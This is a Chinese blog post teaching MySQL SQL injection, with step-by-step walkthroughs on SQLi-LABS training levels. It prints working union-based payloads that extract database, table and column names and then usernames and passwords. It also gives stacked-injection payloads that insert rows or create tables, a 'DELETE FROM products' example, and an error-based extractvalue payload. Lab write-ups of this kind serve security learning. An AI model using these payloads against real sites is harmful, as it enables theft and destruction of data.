<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MySQL数据库注入攻击方式 | Ulysses'Blog</title><meta name="keywords" content="SQL注入"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文主要介绍:MySQL数据库的注入与提取利用">
<meta property="og:type" content="article">
<meta property="og:title" content="MySQL数据库注入攻击方式">
<meta property="og:url" content="https://plumeria.ltd/post/c2f49bfa.html">
<meta property="og:site_name" content="Ulysses&#39;Blog">
<meta property="og:description" content="本文主要介绍:MySQL数据库的注入与提取利用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://plumeria.ltd/img/cover/mysql.jpg">
<meta property="article:published_time" content="2021-10-05T16:43:36.000Z">
<meta property="article:modified_time" content="2021-10-16T07:22:16.871Z">
<meta property="article:author" content="Ulysses">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://plumeria.ltd/img/cover/mysql.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/c2f49bfa"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"W86Z4BMIXY","apiKey":"ab43a60eaebc9c628f7b1eb55825160f","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'MySQL数据库注入攻击方式',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-16 15:22:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/mysql.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MySQL数据库注入攻击方式</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-05T16:43:36.000Z" title="发表于 2021-10-06 00:43:36">2021-10-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-16T07:22:16.871Z" title="更新于 2021-10-16 15:22:16">2021-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MySQL数据库注入攻击方式"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="MySQL数据库基本知识"><a href="#MySQL数据库基本知识" class="headerlink" title="MySQL数据库基本知识"></a>MySQL数据库基本知识</h2><h3 id="MySQL数据库介绍"><a href="#MySQL数据库介绍" class="headerlink" title="MySQL数据库介绍"></a>MySQL数据库介绍</h3><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。</p>
<p>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。由于其社区版的性能卓越，搭配PHP和Apache可组成良好的开发环境。</p>
<p>MySQL服务的默认端口：3306</p>
<h3 id="常见的SQL语句"><a href="#常见的SQL语句" class="headerlink" title="常见的SQL语句"></a>常见的SQL语句</h3><p>创建数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE database_name;</span><br></pre></td></tr></table></figure>
<p>删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE database_name;</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>
<p>创建数据表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(id INT(10),username VARCHAR(20) NOT NULL,password VARCHAR(128),PRIMARY(id));</span><br></pre></td></tr></table></figure>
<p>查看数据表结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC table_name;</span><br></pre></td></tr></table></figure>
<p>插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(username,password) VALUE(&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>
<p>查询数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
<p>更新数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;admin123&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>删除数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="MySQL相关函数与常量"><a href="#MySQL相关函数与常量" class="headerlink" title="MySQL相关函数与常量"></a>MySQL相关函数与常量</h3><ul>
<li><p>system_user() 系统用户名</p>
</li>
<li><p>user() 用户名</p>
</li>
<li><p>current_user() 当前用户名</p>
</li>
<li><p>session_user() 连接数据库的用户名</p>
</li>
<li><p>database() 数据库名</p>
</li>
<li><p>version() mysql数据库版本</p>
</li>
<li><p>load_file() mysql读取本地文件的函数</p>
</li>
<li><p>@@datadir 读取数据库路径</p>
</li>
<li><p>@@basedir mysql安装路径</p>
</li>
<li><p>@@version_compile_os 操作系统版本</p>
</li>
</ul>
<h3 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h3><p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<p><strong>information_schema数据库表说明：</strong></p>
<ul>
<li>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li>
<li>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</li>
<li>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</li>
<li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li>
<li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
<li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li>
<li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li>
<li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li>
<li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li>
<li>COLLATIONS表：提供了关于各字符集的对照信息。</li>
<li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li>
<li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li>
<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
<li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li>
<li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li>
<li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。</li>
</ul>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起，使用为此为UNINO或UNION ALL。</p>
<p>利用前提条件：页面上有回显位。</p>
<p>什么是回显位？</p>
<p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫回显位。</p>
<p><strong>联合注入的过程</strong></p>
<ol>
<li>判断注入点</li>
<li>判断闭合类型</li>
<li>判断查询列数</li>
<li>判断回显位</li>
<li>获取数据库名</li>
<li>获取数据表名</li>
<li>获取字段名</li>
<li>获取数据</li>
</ol>
<p>以下使用SQLi-LAB Less-1做演示，使用的数据库为MySQL。</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>在参数后面直接添加单引号，显示数据库错误信息或者页面回显不同说明存在注入点</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/fjedIBHz96tm7sJ.png" alt="efd00f30ca438d55b6d660f80ad2b67f.png"></p>
<h3 id="判断是闭合类型"><a href="#判断是闭合类型" class="headerlink" title="判断是闭合类型"></a>判断是闭合类型</h3><p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=1 --+</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/AhtWReY9IQpaJEo.png" alt="bf4901f9e301c3f8898a08fdf9689855.png"></p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=2 --+</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/O23b6LAp9azcPKv.png" alt="6453ef15aa63127adbe9679021aa521d.png"></p>
<p>使用<code>&#39;and 1=1</code> 显示正常数据，而使用<code>&#39;and 1=2</code>不显示数据，由此可以判断出该注入的闭合类型为单引号闭合</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次类推。</p>
<p>当排序的列数为3时，发现页面正常显示，说明查询列数≥3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 3 --+</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/CgUasOhqmipowzF.png" alt="548836a22752bc5f1e18bd4f4f170e50.png"></p>
<p>当排序的列数为4时，发现页面报错，说明查询列数&lt;4，由此可以判断出查询列数为3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 4 --+</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/u3Yd7s1NcFVIvBf.png" alt="8ac563257d8084d76e4949c0cc865943.png"></p>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><p>UNION的作用是将两个select查询结果合并。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p><code>http://hackrock.com:811/Less-1/?id=-1&#39; union select 1,2,3 --+</code></p>
<p>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/tL8R4YCDuq9IQsX.png" alt="bfba3026d7a7dde5a4a5d4dc900e3f67.png"></p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>获取数据库版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,version() --+</span><br></pre></td></tr></table></figure>
<p>获取当前数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
<p>获取所有数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取security数据库的所有表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><p>获取security数据库的users表中的字段名（列名）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取当前页面查询数据中的username和password字段中的所有值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(&#x27;&lt;br&gt;&#x27;,username,&#x27;~&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>MySQL字符串连接函数：</p>
<ol>
<li><p>concat()函数 功能：将多个字符串连接成一个字符串。</p>
<p>语法：concat(str1, str2,…)</p>
<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
</li>
<li><p>concat_ws()函数</p>
<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符</p>
<p>语法：concat_ws(separator, str1, str2, …)</p>
<p>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</p>
</li>
<li><p>group_concat()函数</p>
<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
</li>
</ol>
</blockquote>
<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<blockquote>
<p>注：Oracle数据库无法使用堆叠查询。MySQL、PostgreSQL、SQLServer可以使用堆叠查询。</p>
</blockquote>
<h3 id="堆叠注入靶场复现"><a href="#堆叠注入靶场复现" class="headerlink" title="堆叠注入靶场复现"></a>堆叠注入靶场复现</h3><h4 id="sqli-labs-less-39"><a href="#sqli-labs-less-39" class="headerlink" title="sqli-labs less-39"></a>sqli-labs less-39</h4><p><strong>堆叠注入——字符型——GET</strong></p>
<p>源代码：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/OFHGZ31tLE4nmNd.png" alt="2767f275385d1378d9378e245dbd4b62.png"></p>
<p>可以方向查询语句是没有进行过滤的，而且使用PHP的<code>mysqli_multi_query()</code>查询多条语句。</p>
<p>由此构造我们的payload：<code>?id=1;insert into users(id,username,password) values(&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;) --+</code></p>
<p>执行完成，查看security数据库中的users数据表</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/VNG4jXzCx8DwU6O.png" alt="3344e0ed0ac1baeca3f1d4eb2e3fa5d7.png"></p>
<p>成功插入了一条数据。</p>
<h4 id="sqli-labs-less-42"><a href="#sqli-labs-less-42" class="headerlink" title="sqli-labs less-42"></a>sqli-labs less-42</h4><p><strong>报错型堆叠注入——字符型——POST</strong></p>
<p>源代码（login.php）：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/INzeTAucsZJgjQw.png" alt="29efdb0b77231de66c6dd60bdd526ff6.png"></p>
<p>Password 变量在post 过程中，没有通过 <code>mysql_real_escape_string()</code> 函数的处理。因此在登录的时候密码选项我们可以进行 attack。</p>
<blockquote>
<p>mysql_real_escape_string() 函数作用：转义 SQL 语句中使用的字符串中的特殊字符。</p>
</blockquote>
<p>由此构造我们的payload：</p>
<p>username：任意</p>
<p>password：<code>c&#39;;create table like users #</code></p>
<p>security数据库下新增了一个me表</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/wfxjHp6odzyMKsv.png" alt="c1bd08116ad7072d558bb9714c46a3cd.png"></p>
<h2 id="基于函数报错的注入"><a href="#基于函数报错的注入" class="headerlink" title="基于函数报错的注入"></a>基于函数报错的注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>这里主要记录一下<strong>xpath语法错误</strong>和<strong>主键重复错误</strong>。</p>
<p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code> 或 <code>updatexml</code> 两个函数。</p>
<p>使用条件：mysql版本&gt;5.1.5</p>
<h3 id="XPath语法错误"><a href="#XPath语法错误" class="headerlink" title="XPath语法错误"></a>XPath语法错误</h3><h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>正常语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(xml_document,Xpath_string)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
<li>第二个参数：Xpath_string是xpath格式的字符串</li>
<li>作用：从目标xml中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>payload结构：<code>&#39;and extractvalue(1,concat(0x7e,(select语句),0x7e)) --+</code></p>
